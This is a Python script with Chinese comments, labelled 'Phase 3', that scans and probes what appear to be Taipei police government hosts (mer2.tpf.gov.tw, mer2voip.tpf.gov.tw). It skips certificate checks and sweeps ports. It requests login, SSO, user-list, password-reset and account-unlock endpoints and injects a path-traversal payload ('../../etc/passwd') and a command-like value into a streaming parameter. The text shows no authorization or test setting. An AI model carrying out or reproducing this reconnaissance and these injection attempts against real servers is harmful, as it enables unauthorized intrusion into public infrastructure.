#!/usr/bin/env python3
"""Phase 3: 分离 mer2:7000（独立 timeout）/ mer2:443 / mer2voip:30080 / mer2voip:1935"""
import http.client, json, ssl, urllib.parse, sys, socket
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=8, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

# Phase 3-A: mer2:7000 merServer - 独立超时
print("="*80)
print("Phase 3-A: mer2.tpf.gov.tw:7000 merServer (短超时 6s)")
print("="*80)
import os
for path in ['/config', '/login', '/users', '/', '/api/login', '/version', '/health', '/SSO2_Develop/', '/SSO20102/Login', '/Views/CreateSession.aspx']:
    try:
        s, b, _ = req('mer2.tpf.gov.tw', 7000, 'GET', path, timeout=6)
        print(f"  GET {path:40s} → status={s}  body[:120]={b[:120]!r}")
    except Exception as e:
        print(f"  GET {path:40s} → ERROR {type(e).__name__}: {e!r}")

# TCP 直连测试端口可达性
print()
print("TCP 直连测试 mer2.tpf.gov.tw 端口:")
for port in [80, 443, 445, 7000, 7001, 7002, 8080, 8081, 8443, 30080, 30081]:
    try:
        s = socket.create_connection(('mer2.tpf.gov.tw', port), timeout=3)
        s.close()
        print(f"  TCP {port}: OPEN")
    except socket.timeout:
        print(f"  TCP {port}: TIMEOUT (filtered)")
    except Exception as e:
        print(f"  TCP {port}: {e!r}")

print()
print("="*80)
print("Phase 3-B: mer2.tpf.gov.tw:443 HTTPS")
print("="*80)
for path in ['/config', '/login', '/users', '/api/login', '/version', '/health', '/SSO2_Develop/', '/Views/CreateSession.aspx', '/SSO20103/ForgetPwd', '/SSO20109/UnlockAccount']:
    try:
        s, b, _ = req('mer2.tpf.gov.tw', 443, 'GET', path, timeout=8)
        print(f"  GET {path:40s} → status={s}  body[:120]={b[:120]!r}")
    except Exception as e:
        print(f"  GET {path:40s} → ERROR {type(e).__name__}: {e!r}")

print()
print("="*80)
print("Phase 3-C: mer2voip.tpf.gov.tw:30080 RTMP/HLS")
print("="*80)
for path in ['/', '/live', '/live?app=rtmp&stream=test', '/hls', '/hls/test.m3u8', '/rtmp/live', '/api', '/api/health', '/api/health/version', '/live/test', '/live?app=rtmp&stream=../../etc/passwd', '/live?app=rtmp&stream=id', '/live?app=rtmp&stream=rtmp', '/live?app=rtmp&stream=live']:
    try:
        s, b, _ = req('mer2voip.tpf.gov.tw', 30080, 'GET', path, timeout=8)
        print(f"  GET {path:55s} → status={s}  body[:100]={b[:100]!r}")
    except Exception as e:
        print(f"  GET {path:55s} → ERROR {type(e).__name__}")

print()
print("TCP 直连测试 mer2voip.tpf.gov.tw 端口:")
for port in [80, 443, 1935, 30080, 30081]:
    try:
        s = socket.create_connection(('mer2voip.tpf.gov.tw', port), timeout=3)
        s.close()
        print(f"  TCP {port}: OPEN")
    except socket.timeout:
        print(f"  TCP {port}: TIMEOUT (filtered)")
    except Exception as e:
        print(f"  TCP {port}: {e!r}")

print()
print("="*80)
print("Phase 3-D: mer2voip.tpf.gov.tw:1935 RTMP")
print("="*80)
try:
    s = socket.create_connection(('mer2voip.tpf.gov.tw', 1935), timeout=5)
    s.send(b'\x03' + b'\x00'*1536)
    data = s.recv(3073)
    print(f"  RTMP: connected, recv {len(data)} bytes  head={data[:32].hex()}")
    if len(data) >= 3073:
        print(f"  RTMP: 完整 S0+S1+S2 握手响应（1536*3=3073B）！")
    s.close()
except Exception as e:
    print(f"  RTMP port 1935: ERROR {e!r}")

# 也试 30081/30082
for port in [1936, 1937, 30081, 30082, 30083]:
    try:
        s = socket.create_connection(('mer2voip.tpf.gov.tw', port), timeout=2)
        s.close()
        print(f"  TCP {port}: OPEN")
    except:
        pass

